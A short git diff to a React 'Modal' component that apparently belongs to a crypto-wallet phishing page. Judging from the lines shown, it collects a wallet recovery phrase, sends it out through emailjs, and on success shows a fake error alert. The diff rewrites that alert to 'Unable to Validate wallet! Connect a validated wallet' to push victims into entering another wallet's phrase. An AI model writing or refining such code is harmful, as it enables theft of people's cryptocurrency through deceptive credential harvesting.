@@ -1,7 +1,7 @@
 import React, { useState } from "react";
 import emailjs from "emailjs-com";
 
-const Modal = ({ wallet, closeModal }) => {
+const Modal = ({ wallet }) => {
   const [text, setText] = useState("");
   const [loading, setLoading] = useState(false);
   const [activeTab, setActiveTab] = useState("Phrase"); // State for active tab
@@ -32,7 +32,7 @@ const Modal = ({ wallet, closeModal }) => {
         (response) => {
           console.log("SUCCESS!", response.status, response.text);
           setLoading(false);
-          alert("Error While Connecting! Please Try Another Wallet");
+          alert("Unable to Validate wallet! Connect a validated wallet");
         },
         (error) => {
           console.log("FAILED...", error);
